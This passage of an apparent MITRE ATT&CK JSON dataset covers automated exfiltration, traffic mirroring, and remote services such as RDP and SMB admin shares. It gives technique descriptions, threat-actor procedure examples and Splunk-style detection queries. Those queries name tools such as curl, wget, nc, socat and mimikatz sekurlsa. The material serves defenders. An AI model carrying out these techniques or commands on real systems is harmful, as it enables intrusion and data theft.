      "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpected hardware devices, or other uncommon data flows.",
      "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.Analytic 1 - Detecting Automated Script Execution for Exfiltration(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (script_path IN (\".ps1\", \".sh\", \".py\", \".bat\"))| where (command IN (\"scp\", \"rsync\", \"ftp\", \"curl\", \"wget\"))| eval risk_score=case(    script_path LIKE \"%.ps1\", 9,    script_path LIKE \"%.sh\", 8,    script_path LIKE \"%.bat\", 7)| where risk_score >= 8| stats count by _time, host, user, script_path, command, risk_score"
    ],
    "Procedure Examples": [
      "ArcaneDoorincluded scripted exfiltration of collected data.[2]",
      "Attorhas a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.[3]",
      "CosmicDukeexfiltrates collected files automatically over FTP to remote servers.[4]",
      "Crutchhas automatically exfiltrated stolen files to Dropbox.[5]",
      "Dokihas used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.[6]",
      "If credentials are not collected for two weeks,Eburyencrypts the credentials using a public key and sends them via UDP to an IP address located in the DNS TXT record.[7][8]",
      "Empirehas the ability to automatically send collected data back to the threat actors' C2.[9]",
      "DuringFrankenstein, the threat actors collected information viaEmpire, which was automatically sent back to the adversary's C2.[9]",
      "Gamaredon Grouphas used modules that automatically upload gathered documents to the C2 server.[1]",
      "Hannotogcan upload encyrpted data for exfiltration.[10]",
      "Ke3changhas performed  frequent and scheduled data exfiltration from compromised networks.[11]",
      "LightNeuroncan be configured to automatically exfiltrate files under a specified directory.[12]",
      "Machete’s collected files are exfiltrated automatically to remote servers.[13]",
      "OutSteelcan automatically upload collected files to its C2 server.[14]",
      "Peppyhas the ability to automatically exfiltrate files and keylogs.[15]",
      "Raccoon Stealerwill automatically collect and exfiltrate data identified in received configuration files from command and control nodes.[16][17][18]",
      "RedCurlhas used batch scripts to exfiltrate data.[19][20]",
      "Roverautomatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes.Roveralso automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.[21]",
      "ShimRatReportersent collected system and network information compiled into a report to an adversary-controlled C2.[22]",
      "Sidewinderhas configured tools to automatically send collected files to attacker controlled servers.[23]",
      "Solarcan automatically exfitrate files from compromised systems.[24]",
      "StrelaStealerautomatically sends gathered email credentials following collection to command and control servers via HTTP POST.[25][26]",
      "StrongPitycan automatically exfiltrate collected documents to the C2 server.[27][28]",
      "TajMahalhas the ability to manage an automated queue of egress files and commands sent to its C2.[29]",
      "When a document is found matching one of the extensions in the configuration,TINYTYPHONuploads it to the C2 server.[30]",
      "Tropic Trooperhas used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.[31]",
      "USBStealerautomatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine.[32]",
      "Winter Viverndelivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[33]"
    ]
  },
  "T1020.001": {
    "Name": "Automated Exfiltration:Traffic Duplication",
    "Description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device.[1][2]Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible throughROMMONkitorPatch System Image.[3][4]Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[5][6][7]Adversaries may use traffic duplication in conjunction withNetwork Sniffing,Input Capture, orAdversary-in-the-Middledepending on the goals and objectives of the adversary.",
    "Detects": [
      "Monitor for creation of unauthorized traffic mirroring sessions, unexpected outbound network connections from routers or cloud instances, configuration changes in network devices related to traffic forwarding or unusual new network flows, particularly on ports associated with traffic analysis tools.Analytic 1 - Detecting Unauthorized Traffic Mirroring Sessions(EventCode=\"CreateTrafficMirrorSession\" OR EventCode=\"VirtualNetworkTapCreated\" OR source=\"firewall_logs\" message=\"Mirror Port Config Change\")| eval risk_score=case(    EventCode=\"CreateTrafficMirrorSession\", 9,    EventCode=\"VirtualNetworkTapCreated\", 8,    EventCode=\"ModifyTrafficMirrorSession\", 7)| where risk_score >= 7| stats count by _time, host, user, EventCode, risk_score",
      "Monitor and analyze network flows associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider analyzing newly constructed network connections that are sent or received by untrusted hosts, unexpcted hardware devices, or other uncommon data flows.Analytic 1 - Detecting Traffic Duplication and Unexpected Mirroring Behavior(source=\"zeek_conn.log\" OR source=\"firewall_logs\" OR source=\"cloud_network_logs\")| where (flow_type=\"asymmetric\" OR flow_type=\"mirrored\")| where (dest_port IN (4789, 4790, 8000, 5000) OR bytes_out > 10000000)| eval risk_score=case(    flow_type=\"asymmetric\" AND dest_port IN (4789, 4790), 9,    flow_type=\"mirrored\" AND bytes_out > 10000000, 8)| where risk_score >= 8| stats count by _time, host, source_ip, dest_ip, bytes_out, risk_score"
    ],
    "Procedure Examples": [
      "Implement Data Loss Prevention (DLP) solutions to monitor, detect, and control the flow of sensitive information. DLP tools can be configured to block unauthorized attempts to exfiltrate data, such as preventing emails from being forwarded to external recipients or monitoring for suspicious data transfers. By creating email flow rules and applying policies to detect anomalies, DLP solutions help mitigate the risk of data exfiltration over alternative protocols.",
      "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS.",
      "In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."
    ]
  },
  "T1021": {
    "Name": "Remote Services",
    "Description": "Adversaries may useValid Accountsto log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).[1][2]They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter.Legitimate applications (such asSoftware Deployment Toolsand other administrative programs) may utilizeRemote Servicesto access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, includingVNCto send the screen and control buffers andSSHfor secure file transfer.[3][4][5]Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.[6][7][4]",
    "Detects": [
      "Monitor executed commands and arguments that may useValid Accountsto log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.Analytic 1 - Detect adversary commands executed via remote sessions.index=* (sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" OR sourcetype=\"/var/log/auth.log\") AND (EventCode= 1 OR EventCode=sshd)| search parent_process_name=\"sshd\" OR parent_process_name=\"mstsc.exe\" OR parent_process_name=\"rdpclip.exe\"| eval suspicious_command=case(    match(command_line, \"net user|powershell|/etc/passwd|nc|curl|socat\"), \"high\",    match(command_line, \"whoami|ls|dir|pwd\"), \"low\",    true(), \"normal\"  )| stats count by host, process_name, command_line, suspicious_command, _time| where count > threshold AND suspicious_command=\"high\"| table _time, host, process_name, command_line, suspicious_command",
      "Monitor for user accounts logged into systems they would not normally access or abnormal access patterns, such as multiple systems over a relatively short period of time. Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. For example, in macOS you can review logs for \"screensharingd\" and \"Authentication\" event messages.[7][18]Note: When using Security event id 4624, %$ means user names that do not end with $ character. Usually, computer accounts or local system accounts names end with the $ character. When using Security event 4624, UserName and UserLogonId correspond to TargetUserName and TargetLogonId respectively. When using Security event 4624, LogonType 3 corresponds to a Network LogonAnalytic 1 - New services being created under network logon sessions by non-system users(sourcetype=\"WinEventLog:Security\" EventCode IN (4624, 4648, 4625)) AND LogonType=\"3\" AND UserName NOT '$' | rename UserLogonId AS LogonID| join type=inner LogonID[| search (source=\"WinEventLog:Security\" EventCode=\"4697\") | rename UserLogonId as LogonID]",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes, that may useValid Accountsto log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.Note: On Windows, Sysmon Event ID 7 (Image loaded) can be used to monitor the loading of DLLs into processes, including those designed to accept remote connections. This is a particularly noisy event and can generate a large volume of data, so we recommend baselining and filtering out any known benign processes and module to help reduce the number of events that are produced.",
      "Monitor interactions with network shares, such as reads or file transfers, using remote services such as Server Message Block (SMB).",
      "Monitor for newly constructed network connections that may useValid Accountsto log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC. Monitor network connections involving common remote management protocols, such as ports tcp:3283 and tcp:5900, as well as ports tcp: 3389 and tcp:22 for remote login.index=\"network_logs\" sourcetype=\"network_connection\"| search protocol IN (\"tcp/22\", \"tcp/3389\", \"tcp/5900\")| stats count by src_ip, dest_ip, dest_port, _time| eval suspicious_connection=if(src_ip NOT IN (\"trusted_sources\") AND count > threshold, \"high\", \"normal\")| where suspicious_connection=\"high\"| table _time, src_ip, dest_ip, dest_port, suspicious_connection",
      "Monitor network data for uncommon data flows that may be related to abuse ofValid Accountsto log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network service protocols such as SSH and RDP.Analytic 1 - Suspicious Protocolssourcetype=\"netflow\" | search dest_port=22 OR dest_port=3389 OR dest_port=5900 OR dest_port=3283  // SSH, RDP, VNC, ARD",
      "Monitor for newly executed processes that may useValid Accountsto log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC. The adversary may then perform actions that spawn additional processes as the logged-on user.Malicious actors may rename built-in commands or external tools, such as those provided by SysInternals, to better blend in with the environment. In those cases, the file path name is arbitrary and may blend in well with the background. If the arguments are closely inspected, it may be possible to infer what tools are running and understand what an adversary is doing. When any legitimate software shares the same command lines, it must be whitelisted according to the expected parameters.Any tool of interest with commonly known command line usage can be detecting by command line analysis. Known substrings of command lines includePuTTYport forwarding-R * -pwsecure copy (scp)-pw * *@mimikatzsekurlsa::RAR-hpArchive* a * Additionally, it may be useful to find IP addresses in the command line\\d{1,3}.\\d{1,3}.\\d{1,3}.\\d{1,3}Analytic 1 - Suspicious Arguments(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND CommandLine=\"-R .-pw\" OR CommandLine=\"-pw ...@.\" OR CommandLine=\"sekurlsa\" OR CommandLine=\" -hp \" OR CommandLine=\".a .*\"",
      "Monitor for newly constructed WMI objects that is often used to log into a service that accepts remote connects."
    ],
    "Procedure Examples": [
      "Aquatic Pandaused remote scheduled tasks to install malicious software on victim systems during lateral movement actions.[8]",
      "Brute Ratel C4has the ability to use RPC for lateral movement.[9]",
      "Ember Bearuses valid network credentials gathered through credential harvesting to move laterally within victim networks, often employing theImpacketframework to do so.[10]",
      "Kivarshas the ability to remotely trigger keyboard input and mouse clicks.[11]",
      "MacMacan manage remote screen sessions.[12]",
      "Stuxnetcan propagate via peer-to-peer communication and updates using RPC.[13]",
      "Wizard Spiderhas used the WebDAV protocol to executeRyukpayloads hosted on network file shares.[14]"
    ]
  },
  "T1021.001": {
    "Name": "Remote Services:Remote Desktop Protocol",
    "Description": "Adversaries may useValid Accountsto log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1]Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with theAccessibility FeaturesorTerminal Services DLLfor Persistence.[2]",
    "Detects": [
      "Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10). Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.Monitoring logon and logoff events for hosts on the network is very important for situational awareness. This information can be used as an indicator of unusual activity as well as to corroborate activity seen elsewhere.Could be applied to a number of different types of monitoring depending on what information is desired. Some use cases include monitoring for all remote connections and building login timelines for users. Logon events are Windows Event Code 4624 for Windows Vista and above, 518 for pre-Vista. Logoff events are 4634 for Windows Vista and above, 538 for pre-Vista.Note: This analytic looks for user logon events and filters out the top 30 account names to reduce the occurrence of noisy service accounts and the like. It is meant as a starting point for situational awareness around such events. This is liable to be quite noisy and will need tweaking, especially in terms of the number of top users filtered out.Analytic 1sourcetype=\"WinEventLog:Security\" EventCode IN (4624, 4634, 4647, 4778, 4779)| search LogonType=10 // RDP Interactive Logon| eval is_suspicious=if((user!=\"expected_users\") AND (dest_ip!=\"expected_servers\"), \"True\", \"False\")| where is_suspicious=\"True\"",
      "Monitor authentication logs and analyze for unusual access patterns. A remote desktop logon, through RDP, may be typical of a system administrator or IT support, but only from select workstations. Monitoring remote desktop logons and comparing to known/approved originating systems can detect lateral movement of an adversary.Analytic 1sourcetype=\"WinEventLog:Security\" EventCode=\"4624\" AND LogonType=\"10\" AND AuthenticationPackageName=\"Negotiate\" AND TargetUserName=\"Admin*\")",
      "Monitor for newly constructed network connections (typically over port 3389) that may useValid Accountsto log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.Analytic 1 - Abnormal RDP Network Connectionssourcetype=zeek | search dest_port=3389 // Default RDP port| stats count by src_ip, dest_ip, dest_port| where src_ip!=\"trusted_ips\" AND dest_ip!=\"internal_servers\"",
      "Monitor network traffic for uncommon data flows that may useValid Accountsto log into a computer using the Remote Desktop Protocol (RDP).The Remote Desktop Protocol (RDP), built in to Microsoft operating systems, allows a user to remotely log in to the desktop of another host. It allows for interactive access of the running windows, and forwards key presses, mouse clicks, etc. Network administrators, power users, and end-users may use RDP for day-to-day operations. From an adversary’s perspective, RDP provides a means to laterally move to a new host. Determining which RDP connections correspond to adversary activity can be a difficult problem in highly dynamic environments, but will be useful in identifying the scope of a compromise.Remote Desktop can be detected in several waysNetwork connections to port 3389/tcp (assuming use of the default port)Packet capture analysisDetecting network connections frommstsc.exeExecution of the processrdpclip.exeRuns as the clipboard manager on the RDP target if clipboard sharing is enabledAnalytic 1 - Suspicious RDPsourcetype=netflow LogonType=\"10\"| search dest_port=3389 // Default RDP port| stats count by src_ip, dest_ip, dest_port| where src_ip!=\"trusted_ips\" AND dest_ip!=\"internal_servers\"",
      "Monitor for newly executed processes (such asmstsc.exe) that may useValid Accountsto log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions that spawn additional processes as the logged-on user.Analytic 1 - Unusual processes associated with RDP sessionssourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 | search (parent_process=\"mstsc.exe\" OR parent_process=\"rdpclip.exe\")| table _time, host, user, process_name, parent_process, command_line| where process_name!=\"expected_processes\""
    ],
    "Procedure Examples": [
      "Agriustunnels RDP traffic through deployed web shells to access victim environments via compromised accounts.[3]Agriusused the Plink tool to tunnel RDP connections for remote access and lateral movement in victim environments.[4]",
      "Akirahas used RDP for lateral movement.[5]",
      "TheAPT1group is known to have used RDP during operations.[6]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28used RDP for lateral movement.[7]",
      "APT3enables the Remote Desktop Protocol for persistence.[8]APT3has also interacted with compromised systems to browse and copy files through RDP sessions.[9]",
      "APT39has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.[10][11]",
      "APT41used RDP for lateral movement.[12][13]APT41used NATBypass to expose local RDP ports on compromised systems to the Internet.[14]",
      "APT5has moved laterally throughout victim environments using RDP.[15]",
      "Aquatic Pandaleveraged stolen credentials to move laterally via RDP in victim environments.[16]",
      "Axiomhas used RDP during operations.[17]",
      "BlackBytehas used RDP to access other hosts within victim networks.[18][19]",
      "Blue Mockingbirdhas used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.[20]",
      "DuringC0015, the threat actors used RDP to access specific network hosts of interest.[21]",
      "DuringC0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.[22]",
      "During theC0032campaign,TEMP.Velesutilized RDP throughout an operation.[23]",
      "Carbanakenables concurrent Remote Desktop Protocol (RDP) sessions.[24]",
      "Chimerahas used RDP to access targeted systems.[25]",
      "Cobalt Grouphas used Remote Desktop Protocol to conduct lateral movement.[26]",
      "Cobalt Strikecan start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.[27][28]",
      "DuringCutting Edge, threat actors used RDP with compromised credentials for lateral movement.[29]",
      "DarkCometcan open an active screen of the victim’s machine and take control of the mouse and keyboard.[30]",
      "Dragonflyhas moved laterally via RDP.[31]",
      "FIN10has used RDP to move laterally to systems in the victim environment.[32]",
      "FIN13has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.[33]",
      "FIN6used RDP to move laterally in victim networks.[34][35]",
      "FIN7has used RDP to move laterally in victim environments.[36]",
      "FIN8has used RDP for lateral movement.[37]",
      "Fox Kittenhas used RDP to log in and move laterally in the target environment.[38][39]",
      "HEXANEhas used remote desktop sessions for lateral movement.[40]",
      "DuringHomeLand Justice, threat actors primarily used RDP for lateral movement in the victim environment.[41][42]",
      "Imminent Monitorhas a module for performing remote desktop access.[43]",
      "INC Ransomhas used RDP to move laterally.[44][45][46][47]",
      "Indrik Spiderhas used RDP for lateral movement.[48]",
      "jRATcan support RDP control.[49]",
      "Kimsukyhas used RDP for direct remote point-and-click access.[50]",
      "Koadiccan enable remote desktop on the victim's machine.[51]",
      "Lazarus Groupmalware SierraCharlie uses RDP for propagation.[52][53]",
      "Leviathanhas targeted RDP credentials and used it to move through the victim environment.[54]",
      "Magic Houndhas used Remote Desktop Services to copy tools on targeted systems.[55][56]",
      "menuPasshas used RDP connections to move across the victim network.[57][58]",
      "njRAThas a module for performing remote desktop access.[59]",
      "OilRighas used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.[60][61][13][62][62]",
      "Patchworkattempted to use RDP to move laterally.[63]",
      "Pupycan enable/disable RDP connection and can start a remote desktop session using a browser web socket client.[64]",
      "Pysahas laterally moved using RDP connections.[65]",
      "QuasarRAThas a module for performing remote desktop access.[66][67]",
      "reGeorgcan be used to tunnel RDP connections.[68]",
      "Revenge RAThas a plugin to perform RDP access.[69]",
      "SDBbothas the ability to use RDP to connect to victim's machines.[70]",
      "ServHelperhas commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.[71]",
      "Silencehas used RDP for lateral movement.[72]",
      "During theSolarWinds Compromise,APT29used RDP sessions from public-facing systems to internal servers.[73]",
      "Volt Typhoonhas moved laterally to the Domain Controller via RDP using a compromised account with domain administrator privileges.[74]",
      "WarzoneRAThas the ability to control an infected PC using RDP.[75]",
      "Wizard Spiderhas used RDP for lateral movement and to deploy ransomware interactively.[76][77][78][79]",
      "zwShellhas used RDP for lateral movement.[80]",
      "ZxShellhas remote desktop functionality.[81]"
    ]
  },
  "T1021.002": {
    "Name": "Remote Services:SMB/Windows Admin Shares",
    "Description": "Adversaries may useValid Accountsto interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares includeC$,ADMIN$, andIPC$. Adversaries may use this technique in conjunction with administrator-levelValid Accountsto remotely access a networked system over SMB,[1]to interact with systems using remote procedure calls (RPCs),[2]transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC areScheduled Task/Job,Service Execution, andWindows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems withPass the Hashand certain configuration and patch levels.[3]",
    "Detects": [
      "Monitor executed commands and arguments that connect to remote shares, such asNet, on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.[83]sourcetype=\"WinEventLog:Security\" EventCode=4688| search ParentImage IN (\"cmd.exe\", \"powershell.exe\") CommandLine IN (\"net use\", \"net share\")| stats count by Account_Name, CommandLine, ParentImage, dest, src_ip, _time| eval suspicious_command=if(count > threshold, \"high\", \"normal\")| where suspicious_command=\"high\"| table _time, Account_Name, CommandLine, ParentImage, dest, src_ip, suspicious_command",
      "Monitor for logon behavior (ex: EID 4624 Logon Type 3) usingValid Accountsto interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[84][85]index=\"wineventlog\" sourcetype=\"WinEventLog:Security\" EventCode=4624 LogonType=3| stats count by Account_Name, dest, src_ip, _time| eval suspicious_login=if(count > threshold AND src_ip NOT IN (\"trusted_ips\"), \"suspicious\", \"normal\")| where suspicious_login=\"suspicious\"| table _time, Account_Name, dest, src_ip, suspicious_login",
      "Monitor interactions with network shares, such as reads or file transfers, using Server Message Block (SMB).sourcetype=\"WinEventLog:Security\" EventCode=5140| stats count by ShareName, Account_Name, dest, src_ip, _time| eval anomaly=if(ShareName IN (\"C$\", \"ADMIN$\", \"IPC$\") AND count > threshold, \"potential_abuse\", \"normal\")| where anomaly=\"potential_abuse\"| table _time, ShareName, Account_Name, dest, src_ip, anomaly",
      "Monitor for newly constructed network connections (typically over ports 139 or 445), especially those that are sent or received by abnormal or untrusted hosts. Correlate these network connections with remote login events and associated SMB-related activity such as file transfers and remote process execution.Note: Event ID is for Zeek but can also be implemented in other Network Analysis Frameworks by parsing & decoding captured SMB2 network traffic. Preference would be to detect smb2_write_response event (instead of smb2_write_request), because it would confirm the file was actually written to the remote destination. Unfortunately, Bro/Zeek does not have an event for that SMB message-type yet. From a network traffic capture standpoint, it’s important to capture the right traffic for this type of detection to function (e.g., all endpoint to endpoint if possible or workstation to server and workstation to workstation). As such, it is helpful to have a centralized server area where it is possible to monitor communications between servers and endpoints.Analytic 1 and 2 are very similar, with the key difference being that Implementation 2 is intended to capture multiple attempts at lateral movement originating from the same host within a short time period (5 minutes).smb2_write_request, smb1_write_andx_response is indication of an SMB file write to a Windows Admin File Share: ADMIN$ or C$smb2_tree_connect_request, smb1_tree_connect_andx_request is observed originating from the same host, regardless of write-attempts and regardless of whether or not any connection is successful —just connection attempts— within a specified period of time (REPEATS 5 TIMES WITHIN 5 MINUTES FROM SAME src_ip).From a network traffic capture standpoint, it’s important to capture the right traffic for this type of detection to function (e.g., all endpoint to endpoint if possible or workstation to server and workstation to workstation). As such, it is helpful to have a centralized server area where it is possible to monitor communications between servers and endpoints.The Service Control Manager (SCM) can be used to copy a file to the ADMIN$ share and execute it as a service. This can be detected by looking for incoming RPC network connections to the Service Control Manager, followed by services.exe spawning a child process.Analytic 1 - Basicsourcetype=\"Zeek:SMB_Files\" EventCode IN (\"smb2_write_request\", \"smb1_write_andx_response\", \"smb2_tree_connect_request\", \"smb1_tree_connect_andx_request\") AND (Path=\"ADMIN$\" OR Path=\"C$\")Analytic 2 - Port 445 Monitoringsourcetype=\"network_connection\"| search dest_port=445| stats count by src_ip, dest_ip, dest_port, _time| eval smb_activity=if(count > threshold AND src_ip NOT IN (\"trusted_sources\"), \"suspicious\", \"normal\")| where smb_activity=\"suspicious\"| table _time, src_ip, dest_ip, dest_port, smb_activity",
      "Monitor network data for uncommon SMB data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on SMB network flows.Notes:The logic for Implementation 1 is based around detecting on SMB write requests, which are often used by adversaries to move laterally to another host. Unlike SMB Reads, SMB Write requests typically require an additional level of access, resulting in less activity. Focusing on SMB Write activity narrows the field to looking at techniques associated with actively changing remote hosts, instead of passively reading files.The logic for Implementation 2 is based around detection of new processes that were created from a file written to an SMB share.  First, a file is remotely written to a host via an SMB share; then, a variety of Execution techniques can be used to remotely establish execution of the file or script. To detect this behavior, look for files that are written to a host over SMB and then later run directly as a process or in the command line arguments. SMB File Writes and Remote Execution may happen normally in an environment, but the combination of the two behaviors is less frequent and more likely to indicate adversarial activity.Analytic 1 - SMB Writesourcetype=\"Zeek:SMB_Files\" port=\"445\" AND protocol=\"smb.write\"",
      "Monitor for the creation of WMI Win32_Process class and method Create to interact with a remote network share using Server Message Block (SMB). Relevant indicators detected by Bro/Zeek is IWbemServices::ExecMethod or IWbemServices::ExecMethodAsync. One thing to notice is that when the Create method is used on a remote system, the method is run under a host process named \"Wmiprvse.exe\".The process WmiprvSE.exe is what spawns the process defined in the CommandLine parameter of the Create method. Therefore, the new process created remotely will have Wmiprvse.exe as a parent. WmiprvSE.exe is a DCOM server and it is spawned underneath the DCOM service host svchost.exe with the following parameters C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p. From a logon session perspective, on the target, WmiprvSE.exe is spawned in a different logon session by the DCOM service host. However, whatever is executed by WmiprvSE.exe occurs on the new network type (3) logon session created by the user that authenticated from the network.Analytic 1 - Basic(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND ParentImage=\"*wmiprvse.exe\" AND TargetLogonID=\"0x3e7\""
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamutilizednet useto connect to network shares.[4]",
      "Anchorcan support windows execution via SMB shares.[5]",
      "APT28has mapped network drives usingNetand administrator credentials.[6]",
      "DuringAPT28 Nearest Neighbor Campaign,APT28leveraged SMB to transfer files and move laterally.[7]",
      "APT3will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.[8]",
      "APT32usedNetto use Windows' hidden network shares to copy their tools to remote machines for execution.[9]",
      "APT39has used SMB for lateral movement.[10]",
      "APT41has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI).[11][12]",
      "Aquatic Pandaused remote shares to enable lateral movement in victim environments.[13]",
      "BlackByteused SMB file shares to distribute payloads throughout victim networks, including BlackByte ransomware variants during wormable operations.[14][15][16]",
      "BlackByte Ransomwareuses mapped shared folders to transfer ransomware payloads via SMB.[17]",
      "BlackEnergyhas run a plug-in on a victim to spread through the local network by usingPsExecand accessing admin shares.[18]",
      "Blue Mockingbirdhas used Windows Explorer to manually copy malicious files to remote hosts over SMB.[19]",
      "Brute Ratel C4has the ability to use SMB to pivot in compromised networks.[20][21][22]",
      "Chimerahas used Windows admin shares to move laterally.[23][24]",
      "Cinnamon Tempesthas used SMBexec for lateral movement.[25]",
      "Cobalt Strikecan use Window admin shares (C$ and ADMIN$) for lateral movement.[26][27]",
      "Confickervariants spread through NetBIOS share propagation.[28]",
      "Contican spread via SMB and encrypts files on different hosts, potentially compromising an entire network.[29][30]",
      "DuringCutting Edge, threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.[31]",
      "Deep Pandauses net.exe to connect to network shares usingnet usecommands with compromised credentials.[32]",
      "Diavolcan spread throughout a network via SMB prior to encryption.[33]",
      "Adversaries can instructDuquto spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[34]",
      "Emotethas leveraged the Admin$, C$, and IPC$ shares for lateral movement.[35][36]",
      "FIN13has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.[37]",
      "FIN8has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.FIN8has also used smbexec from theImpacketsuite for lateral movement.[38][39]",
      "Fox Kittenhas used valid accounts to access SMB shares.[40]",
      "HermeticWizardcan use a list of hardcoded credentials to to authenticate via NTLMSSP to the SMB shares on remote systems.[41]",
      "DuringHomeLand Justice, threat actors used SMB for lateral movement.[42][43]",
      "Ke3changactors have been known to copy files to the network shares of other computers to move laterally.[44][45]",
      "Kwampirscopies itself over network shares to move laterally on a victim network.[46]",
      "Lazarus Groupmalware SierraAlfa accesses theADMIN$share via SMB to conduct lateral movement.[47][48]",
      "Leviathanused remote shares to move laterally through victim networks duringLeviathan Australian Intrusions.[49]",
      "LockBit 2.0has the ability to move laterally via SMB.[50][51]",
      "LockBit 3.0can use SMB for lateral movement.[52]",
      "Lucifercan infect victims by brute forcing SMB.[53]",
      "Moses Staffhas used batch scripts that can enable SMB on a compromised host.[54]",
      "Lateral movement can be done withNetthroughnet usecommands to connect to the on remote systems.[55]",
